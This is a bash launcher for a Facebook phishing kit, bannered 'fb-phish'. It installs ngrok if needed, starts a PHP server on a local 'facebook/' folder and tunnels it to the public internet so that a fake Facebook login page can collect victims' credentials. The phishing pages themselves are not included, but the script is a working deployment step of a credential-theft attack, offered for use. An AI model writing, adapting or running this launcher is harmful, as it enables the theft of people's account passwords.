#!bin/bash
clear
printf "\e[34m"
echo -e "      __ _                     _     _     _     "
echo -e "     / _| |__            _ __ | |__ (_)___| |__  "
echo -e "    | |_| '_ \   _____  | '_ \| '_ \| / __| '_ \ "
echo -e "    |  _| |_) | |_____| | |_) | | | | \__ \ | | |"
echo -e "    |_| |_.__/          | .__/|_| |_|_|___/_| |_|"
echo -e "                        |_|                      "
echo -e ""
sleep 2
echo -e "\e[0m   facebook: https://facebook.com/tutorialmaniabd"
sleep 5
echo -e ""
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it: apt-get install php. Aborting."; exit 1; }

if [[ -e ngrok ]]; then
chmod +x ngrok
echo -e "\e[92mNgrok Found\e[97m \n"
elif [[ ! -e ngrok ]]; then
echo -e "\e[92m Ngrok not found. Downloading Ngrok...\e[0m"
apt-get install wget -y
apt-get install unzip -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
echo -e "\e[92mNgrok Found\e[97m"
else
printf "\e[1;93m[!] Download error...\e[0m\e[1;77m Please cheack your internet connection.\e[0m\n"
exit 1
fi

killall -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:4444 -t facebook/ > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
sleep 3
./ngrok http 127.0.0.1:4444
